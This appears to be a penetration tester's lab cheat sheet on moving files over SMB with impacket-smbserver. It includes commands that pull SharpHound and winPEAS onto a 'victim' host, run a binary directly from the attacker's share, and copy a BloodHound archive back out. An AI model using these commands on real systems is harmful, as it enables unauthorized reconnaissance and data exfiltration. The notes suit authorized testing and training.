Use -smb2support to avoid error below:
impacket-smbserver share ./ -smb2support

Use -smb2support -user vk9guest -pass ‘’ to avoid the previous, and following error:
impacket-smbserver share ./ -smb2support -user test -pass '' 

impacket-smbserver share ./ -smb2support -user test -pass ''
Login like this if you've encountered the previous errors:
net use \\192.168.119.231\share /USER:test

Copy file from attacking machine to victim:
copy \\192.168.119.168\share\SharpHound.exe

Run binary through the smbshare without saving binary on disk:
\\192.168.119.168\share\winPEASany.exe

Copy files from victim to our share on attacking machine:
copy 20220424074629_BloodHound.zip \\192.168.119.213\share

Disconnect all shares:
net use * /del /y
![unnamed_dc8abdc75c124f289508e6fe080dc18e](unnamed_dc8abdc75c124f289508e6fe080dc18e.png)
![unnamed_49c4079fa0134effb748e9db451d4dd6](unnamed_49c4079fa0134effb748e9db451d4dd6.png)
![unnamed_a5e9d885a9d242c2bd6ad6f9575646c1](unnamed_a5e9d885a9d242c2bd6ad6f9575646c1.png)